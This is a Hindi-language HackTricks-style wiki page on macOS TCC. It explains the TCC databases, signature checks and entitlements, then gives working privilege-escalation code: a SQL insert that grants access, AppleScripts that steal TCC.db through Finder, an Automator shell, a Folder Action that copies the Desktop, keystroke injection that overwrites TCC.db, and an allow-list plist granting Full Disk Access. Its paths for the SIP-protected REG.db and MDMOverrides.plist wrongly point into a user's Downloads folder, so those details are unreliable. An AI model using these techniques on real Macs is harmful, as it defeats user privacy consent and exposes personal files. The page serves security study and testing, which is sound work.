# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **बुनियादी जानकारी**

**TCC (Transparency, Consent, and Control)** एक सुरक्षा प्रोटोकॉल है जो एप्लिकेशन अनुमतियों को नियंत्रित करने पर केंद्रित है। इसकी प्राथमिक भूमिका संवेदनशील सुविधाओं जैसे **स्थान सेवाएँ, संपर्क, फ़ोटो, माइक्रोफ़ोन, कैमरा, पहुँच, और पूर्ण डिस्क एक्सेस** की सुरक्षा करना है। TCC उपयोगकर्ता की स्पष्ट सहमति को अनिवार्य करके इन तत्वों तक ऐप की पहुँच प्रदान करता है, जिससे गोपनीयता और उपयोगकर्ता के डेटा पर नियंत्रण बढ़ता है।

उपयोगकर्ता TCC का सामना तब करते हैं जब एप्लिकेशन संरक्षित सुविधाओं तक पहुँच का अनुरोध करते हैं। यह एक प्रॉम्प्ट के माध्यम से दिखाई देता है जो उपयोगकर्ताओं को **पहुँच को स्वीकृत या अस्वीकृत** करने की अनुमति देता है। इसके अलावा, TCC सीधे उपयोगकर्ता क्रियाओं को समायोजित करता है, जैसे कि **फाइलों को एक एप्लिकेशन में खींचना और छोड़ना**, ताकि विशिष्ट फ़ाइलों तक पहुँच प्रदान की जा सके, यह सुनिश्चित करते हुए कि एप्लिकेशन केवल वही एक्सेस प्राप्त करें जो स्पष्ट रूप से अनुमत है।

![An example of a TCC prompt](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** का प्रबंधन **daemon** द्वारा किया जाता है जो `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` में स्थित है और `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` में कॉन्फ़िगर किया गया है (mach सेवा `com.apple.tccd.system` को पंजीकृत करना)।

एक **उपयोगकर्ता-मोड tccd** प्रत्येक लॉग इन उपयोगकर्ता के लिए चल रहा है जो `/System/Library/LaunchAgents/com.apple.tccd.plist` में परिभाषित है, जो mach सेवाओं `com.apple.tccd` और `com.apple.usernotifications.delegate.com.apple.tccd` को पंजीकृत करता है।

यहाँ आप tccd को सिस्टम और उपयोगकर्ता के रूप में चलते हुए देख सकते हैं:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
अनुमतियाँ **माता-पिता** एप्लिकेशन से **विरासत में** मिलती हैं और **अनुमतियाँ** **Bundle ID** और **Developer ID** के आधार पर **ट्रैक** की जाती हैं।

### TCC डेटाबेस

अनुमतियाँ/निषेध फिर कुछ TCC डेटाबेस में संग्रहीत की जाती हैं:

- सिस्टम-व्यापी डेटाबेस **`/Library/Application Support/com.apple.TCC/TCC.db`** में।
- यह डेटाबेस **SIP संरक्षित** है, इसलिए केवल एक SIP बायपास इसमें लिख सकता है।
- उपयोगकर्ता TCC डेटाबेस **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** प्रति-उपयोगकर्ता प्राथमिकताओं के लिए।
- यह डेटाबेस संरक्षित है इसलिए केवल उच्च TCC विशेषाधिकार वाले प्रक्रियाएँ जैसे कि पूर्ण डिस्क एक्सेस इसमें लिख सकती हैं (लेकिन यह SIP द्वारा संरक्षित नहीं है)।

> [!WARNING]
> पिछले डेटाबेस भी **पढ़ने के लिए TCC संरक्षित** हैं। इसलिए आप **अपनी नियमित उपयोगकर्ता TCC डेटाबेस नहीं पढ़ पाएंगे** जब तक कि यह TCC विशेषाधिकार प्राप्त प्रक्रिया से न हो।
>
> हालाँकि, याद रखें कि इन उच्च विशेषाधिकार वाली प्रक्रिया (जैसे **FDA** या **`kTCCServiceEndpointSecurityClient`**) को उपयोगकर्ता TCC डेटाबेस में लिखने की अनुमति होगी।

- एक **तीसरा** TCC डेटाबेस **`/var/db/locationd/clients.plist`** में है जो उन क्लाइंट्स को इंगित करता है जिन्हें **स्थान सेवाओं** तक पहुँचने की अनुमति है।
- SIP संरक्षित फ़ाइल **`/Users/carlospolop/Downloads/REG.db`** (जो पढ़ने की पहुँच से TCC द्वारा भी संरक्षित है), सभी **मान्य TCC डेटाबेस** का **स्थान** रखती है।
- SIP संरक्षित फ़ाइल **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (जो पढ़ने की पहुँच से TCC द्वारा भी संरक्षित है), अधिक TCC दी गई अनुमतियों को रखती है।
- SIP संरक्षित फ़ाइल **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (जो किसी के द्वारा पढ़ी जा सकती है) उन अनुप्रयोगों की अनुमति सूची है जिन्हें TCC अपवाद की आवश्यकता है।

> [!TIP]
> **iOS** में TCC डेटाबेस **`/private/var/mobile/Library/TCC/TCC.db`** में है।

> [!NOTE]
> **सूचना केंद्र UI** **सिस्टम TCC डेटाबेस** में **परिवर्तन** कर सकता है:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> हालाँकि, उपयोगकर्ता **`tccutil`** कमांड लाइन उपयोगिता के साथ **नियमों को हटा या क्वेरी** कर सकते हैं।

#### डेटाबेस क्वेरी करें

{{#tabs}}
{{#tab name="user DB"}}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}

{{#tab name="system DB"}}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}
{{#endtabs}}

> [!TIP]
> दोनों डेटाबेस की जांच करके आप देख सकते हैं कि किसी ऐप को कौन सी अनुमतियाँ दी गई हैं, कौन सी मना की गई हैं, या कौन सी नहीं हैं (यह इसके लिए पूछेगा)।

- **`service`** TCC **अनुमति** का स्ट्रिंग प्रतिनिधित्व है
- **`client`** **बंडल ID** या **बाइनरी का पथ** है जिसमें अनुमतियाँ हैं
- **`client_type`** यह दर्शाता है कि यह एक बंडल पहचानकर्ता(0) है या एक पूर्ण पथ(1)

<details>

<summary>यदि यह एक पूर्ण पथ है तो कैसे निष्पादित करें</summary>

बस **`launctl load you_bin.plist`** करें, एक plist के साथ जैसे:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

- **`auth_value`** के विभिन्न मान हो सकते हैं: denied(0), unknown(1), allowed(2), या limited(3).
- **`auth_reason`** निम्नलिखित मान ले सकता है: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- **csreq** फ़ील्ड यह संकेत करने के लिए है कि बाइनरी को कैसे सत्यापित किया जाए और TCC अनुमतियाँ दी जाएँ:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
- अधिक जानकारी के लिए **अन्य क्षेत्रों** के बारे में [**इस ब्लॉग पोस्ट**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive) को देखें।

आप `System Preferences --> Security & Privacy --> Privacy --> Files and Folders` में ऐप्स को **पहले से दिए गए अनुमतियों** की भी जांच कर सकते हैं।

> [!TIP]
> उपयोगकर्ता _कर सकते हैं_ **नियमों को हटाना या पूछताछ करना** **`tccutil`** का उपयोग करके।

#### TCC अनुमतियों को रीसेट करें
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC Signature Checks

TCC **database** एप्लिकेशन का **Bundle ID** स्टोर करता है, लेकिन यह **signature** के बारे में **जानकारी** भी **स्टोर** करता है ताकि यह **सुनिश्चित** किया जा सके कि अनुमति का उपयोग करने के लिए ऐप सही है।
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
> [!WARNING]
> इसलिए, समान नाम और बंडल आईडी वाले अन्य अनुप्रयोगों को अन्य ऐप्स को दिए गए अनुमतियों तक पहुंच प्राप्त नहीं होगी।

### अधिकार और TCC अनुमतियाँ

ऐप्स **केवल आवश्यकता नहीं है** कि वे **अनुरोध करें** और कुछ संसाधनों तक **पहुँच प्राप्त करें**, उन्हें **संबंधित अधिकार भी होने चाहिए।**\
उदाहरण के लिए, **Telegram** के पास **कैमरे तक पहुँच** के लिए `com.apple.security.device.camera` का अधिकार है। एक **ऐप** जो **इस अधिकार** के बिना है, वह कैमरे तक पहुँच **नहीं प्राप्त कर सकेगा** (और उपयोगकर्ता से अनुमतियों के लिए भी नहीं पूछा जाएगा)।

हालांकि, ऐप्स को **कुछ उपयोगकर्ता फ़ोल्डरों** जैसे `~/Desktop`, `~/Downloads` और `~/Documents` तक **पहुँच** प्राप्त करने के लिए किसी विशेष **अधिकार** की आवश्यकता **नहीं है।** सिस्टम स्वचालित रूप से पहुँच को संभालेगा और **उपयोगकर्ता को** आवश्यकतानुसार **प्रॉम्प्ट करेगा।**

Apple के ऐप्स **प्रॉम्प्ट नहीं बनाएंगे।** उनके **अधिकार** सूची में **पूर्व-प्रदान किए गए अधिकार** होते हैं, जिसका अर्थ है कि वे **कभी भी पॉपअप नहीं बनाएंगे**, **न ही** वे किसी भी **TCC डेटाबेस** में दिखाई देंगे। उदाहरण के लिए:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
यह कैलेंडर को उपयोगकर्ता से अनुस्मारक, कैलेंडर और पते की पुस्तक तक पहुँचने के लिए पूछने से रोकेगा।

> [!TIP]
> अधिकारों के बारे में कुछ आधिकारिक दस्तावेज़ों के अलावा, **अनौपचारिक रूप से दिलचस्प जानकारी अधिकारों के बारे में** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl) मिलना भी संभव है।

कुछ TCC अनुमतियाँ हैं: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... इन सभी को परिभाषित करने वाली कोई सार्वजनिक सूची नहीं है, लेकिन आप इस [**ज्ञात की सूची**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service) की जांच कर सकते हैं।

### संवेदनशील असुरक्षित स्थान

- $HOME (स्वयं)
- $HOME/.ssh, $HOME/.aws, आदि
- /tmp

### उपयोगकर्ता इरादा / com.apple.macl

जैसा कि पहले उल्लेख किया गया है, **किसी फ़ाइल के लिए एक ऐप को पहुँच देने के लिए उसे खींचकर और छोड़कर** यह संभव है। यह पहुँच किसी भी TCC डेटाबेस में निर्दिष्ट नहीं होगी, बल्कि फ़ाइल के **विस्तारित** **गुण के रूप में होगी**। यह गुण **अनुमत ऐप का UUID** संग्रहीत करेगा:
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
> [!NOTE]
> यह दिलचस्प है कि **`com.apple.macl`** विशेषता **Sandbox** द्वारा प्रबंधित की जाती है, न कि tccd द्वारा।
>
> यह भी ध्यान दें कि यदि आप एक फ़ाइल को अपने कंप्यूटर में एक ऐप के UUID के साथ किसी अन्य कंप्यूटर में ले जाते हैं, तो क्योंकि उसी ऐप के अलग-अलग UIDs होंगे, यह उस ऐप को एक्सेस नहीं देगा।

विस्तारित विशेषता `com.apple.macl` **अन्य विस्तारित विशेषताओं** की तरह **हटाई नहीं जा सकती** क्योंकि यह **SIP द्वारा संरक्षित** है। हालाँकि, [**इस पोस्ट में समझाया गया है**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), इसे **ज़िप** करके, **हटाकर** और **अनज़िप** करके अक्षम करना संभव है।

## TCC Privesc & Bypasses

### TCC में डालें

यदि किसी बिंदु पर आप TCC डेटाबेस पर लिखने की पहुंच प्राप्त कर लेते हैं, तो आप निम्नलिखित का उपयोग करके एक प्रविष्टि जोड़ सकते हैं (टिप्पणियाँ हटा दें):

<details>

<summary>TCC में डालने का उदाहरण</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Payloads

यदि आप किसी ऐप में कुछ TCC अनुमतियों के साथ अंदर जाने में सफल रहे हैं, तो उनका दुरुपयोग करने के लिए TCC पेलोड्स के साथ निम्नलिखित पृष्ठ की जांच करें:

{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Apple Events के बारे में जानें:

{{#ref}}
macos-apple-events.md
{{#endref}}

### Automation (Finder) to FDA\*

Automation अनुमति का TCC नाम है: **`kTCCServiceAppleEvents`**\
यह विशेष TCC अनुमति यह भी इंगित करती है कि **कौन सा एप्लिकेशन** TCC डेटाबेस के अंदर प्रबंधित किया जा सकता है (इसलिए अनुमतियाँ केवल सब कुछ प्रबंधित करने की अनुमति नहीं देती हैं)।

**Finder** एक एप्लिकेशन है जो **हमेशा FDA** रखता है (भले ही यह UI में न दिखाई दे), इसलिए यदि आपके पास इसके ऊपर **Automation** विशेषाधिकार हैं, तो आप इसके विशेषाधिकारों का दुरुपयोग करके **कुछ क्रियाएँ करवा सकते हैं**।\
इस मामले में आपके ऐप को **`com.apple.Finder`** पर **`kTCCServiceAppleEvents`** अनुमति की आवश्यकता होगी।

{{#tabs}}
{{#tab name="Steal users TCC.db"}}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}

{{#tab name="Steal systems TCC.db"}}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}
{{#endtabs}}

आप इसका दुरुपयोग करके **अपना खुद का उपयोगकर्ता TCC डेटाबेस लिख सकते हैं**।

> [!WARNING]
> इस अनुमति के साथ आप **फाइंडर से TCC प्रतिबंधित फ़ोल्डरों तक पहुँचने के लिए पूछ सकते हैं** और आपको फ़ाइलें मिलेंगी, लेकिन afaik आप **फाइंडर को मनमाना कोड निष्पादित करने के लिए मजबूर नहीं कर पाएंगे** ताकि उसके FDA एक्सेस का पूरी तरह से दुरुपयोग किया जा सके।
>
> इसलिए, आप पूर्ण FDA क्षमताओं का दुरुपयोग नहीं कर पाएंगे।

यह फाइंडर पर स्वचालन विशेषाधिकार प्राप्त करने के लिए TCC प्रॉम्प्ट है:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> ध्यान दें कि क्योंकि **ऑटोमेटर** ऐप के पास TCC अनुमति **`kTCCServiceAppleEvents`** है, यह **किसी भी ऐप को नियंत्रित कर सकता है**, जैसे फाइंडर। इसलिए ऑटोमेटर को नियंत्रित करने की अनुमति होने पर आप नीचे दिए गए कोड की तरह **फाइंडर** को भी नियंत्रित कर सकते हैं:

<details>

<summary>ऑटोमेटर के अंदर एक शेल प्राप्त करें</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

**स्क्रिप्ट संपादक ऐप** के साथ भी यही होता है, यह फ़ाइंडर को नियंत्रित कर सकता है, लेकिन एक AppleScript का उपयोग करके आप इसे एक स्क्रिप्ट निष्पादित करने के लिए मजबूर नहीं कर सकते।

### स्वचालन (SE) कुछ TCC के लिए

**सिस्टम इवेंट्स फ़ोल्डर क्रियाएँ बना सकते हैं, और फ़ोल्डर क्रियाएँ कुछ TCC फ़ोल्डरों (डेस्कटॉप, दस्तावेज़ और डाउनलोड) तक पहुँच सकती हैं**, इसलिए निम्नलिखित स्क्रिप्ट का उपयोग इस व्यवहार का दुरुपयोग करने के लिए किया जा सकता है:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Automation (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** to FDA\*

**`System Events`** पर ऑटोमेशन + एक्सेसिबिलिटी (**`kTCCServicePostEvent`**) **प्रक्रियाओं** को **कीस्ट्रोक्स** भेजने की अनुमति देती है। इस तरह आप फ़ाइंडर का दुरुपयोग करके उपयोगकर्ताओं का TCC.db बदल सकते हैं या किसी मनचाही ऐप को FDA दे सकते हैं (हालांकि इसके लिए पासवर्ड मांगा जा सकता है)।

उपयोगकर्ताओं के TCC.db को ओवरराइट करने का फ़ाइंडर उदाहरण:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` to FDA\*

इस पृष्ठ पर कुछ [**पेलोड्स की जांच करें जो एक्सेसिबिलिटी अनुमतियों का दुरुपयोग करते हैं**](macos-tcc-payloads.md#accessibility) ताकि FDA\* तक पहुंच प्राप्त की जा सके या उदाहरण के लिए एक कीलॉगर चलाया जा सके।

### **Endpoint Security Client to FDA**

यदि आपके पास **`kTCCServiceEndpointSecurityClient`** है, तो आपके पास FDA है। समाप्त।

### System Policy SysAdmin File to FDA

**`kTCCServiceSystemPolicySysAdminFiles`** एक उपयोगकर्ता के **`NFSHomeDirectory`** विशेषता को **बदलने** की अनुमति देता है, जो उसके होम फ़ोल्डर को बदलता है और इसलिए **TCC** को **बायपास** करने की अनुमति देता है।

### User TCC DB to FDA

**यूजर TCC** डेटाबेस पर **लिखने की अनुमतियाँ** प्राप्त करने पर आप **`FDA`** अनुमतियाँ नहीं दे सकते, केवल वही जो सिस्टम डेटाबेस में रहता है वह ऐसा कर सकता है।

लेकिन आप **`Finder के लिए ऑटोमेशन अधिकार`** दे सकते हैं, और FDA\* तक पहुंच बढ़ाने के लिए पिछले तकनीक का दुरुपयोग कर सकते हैं।

### **FDA to TCC permissions**

**पूर्ण डिस्क एक्सेस** का TCC नाम **`kTCCServiceSystemPolicyAllFiles`** है।

मुझे नहीं लगता कि यह एक वास्तविक प्रिवेस्क है, लेकिन अगर आप इसे उपयोगी पाते हैं: यदि आप FDA के साथ एक प्रोग्राम को नियंत्रित करते हैं, तो आप **उपयोगकर्ताओं के TCC डेटाबेस को संशोधित कर सकते हैं और अपने लिए कोई भी एक्सेस दे सकते हैं**। यह एक स्थायी तकनीक के रूप में उपयोगी हो सकता है यदि आप अपनी FDA अनुमतियाँ खो देते हैं।

### **SIP Bypass to TCC Bypass**

सिस्टम **TCC डेटाबेस** को **SIP** द्वारा सुरक्षित किया गया है, यही कारण है कि केवल **निर्दिष्ट अधिकारों वाले प्रक्रियाएँ इसे संशोधित करने में सक्षम होंगी**। इसलिए, यदि एक हमलावर एक **SIP बायपास** पाता है जो एक **फाइल** पर है (SIP द्वारा प्रतिबंधित एक फ़ाइल को संशोधित करने में सक्षम होना), तो वह सक्षम होगा:

- **TCC डेटाबेस की सुरक्षा को हटा दें**, और अपने लिए सभी TCC अनुमतियाँ दें। वह उदाहरण के लिए इन फ़ाइलों में से किसी का दुरुपयोग कर सकता है:
- TCC सिस्टम डेटाबेस
- REG.db
- MDMOverrides.plist

हालांकि, इस **SIP बायपास का TCC बायपास करने के लिए** दुरुपयोग करने का एक और विकल्प है, फ़ाइल `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` उन अनुप्रयोगों की अनुमति सूची है जिन्हें TCC अपवाद की आवश्यकता होती है। इसलिए, यदि एक हमलावर इस फ़ाइल से **SIP सुरक्षा को हटा सकता है** और अपना **स्वयं का अनुप्रयोग** जोड़ सकता है, तो अनुप्रयोग TCC को बायपास करने में सक्षम होगा।\
उदाहरण के लिए टर्मिनल जोड़ने के लिए:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC Bypasses

{{#ref}}
macos-tcc-bypasses/
{{#endref}}

## References

- [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

{{#include ../../../../banners/hacktricks-training.md}}
